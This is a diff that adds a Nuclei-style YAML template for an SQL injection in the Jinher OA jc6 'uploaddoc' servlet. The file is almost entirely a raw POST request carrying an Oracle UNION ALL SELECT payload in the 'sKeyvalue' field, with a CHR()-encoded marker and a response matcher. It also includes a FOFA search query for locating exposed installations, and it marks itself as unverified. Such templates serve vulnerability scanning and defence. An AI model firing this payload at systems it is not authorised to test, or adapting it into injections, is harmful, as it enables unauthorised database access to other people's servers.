@@ -1,0 +1,30 @@
+id: jinher-oa-jc6-uploaddoc-sqli
+
+info:
+  name: 金和 OA jc6 uploaddoc - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    veified: false
+    max-request: 1
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+    tips: oracle
+  tags: jinher,oa,sqli
+
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/uploaddoc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        key=readimage&sKeyvalue=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||CHR(121)||CHR(117)||CHR(70)||CHR(66)||CHR(77)||CHR(81)||CHR(82)||CHR(73)||CHR(102)||CHR(66)||CHR(109)||CHR(122)||CHR(65)||CHR(75)||CHR(83)||CHR(77)||CHR(65)||CHR(77)||CHR(84)||CHR(82)||CHR(90)||CHR(117)||CHR(100)||CHR(99)||CHR(84)||CHR(65)||CHR(112)||CHR(97)||CHR(114)||CHR(112)||CHR(109)||CHR(100)||CHR(116)||CHR(73)||CHR(74)||CHR(85)||CHR(85)||CHR(121)||CHR(87)||CHR(103)||CHR(113)||CHR(118)||CHR(112)||CHR(122)||CHR(113) FROM DUAL-- zOvI
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - qvpqqyuFBMQRIfBmzAKSMAMTRZudcTAparpmdtIJUUyWgqvpzq
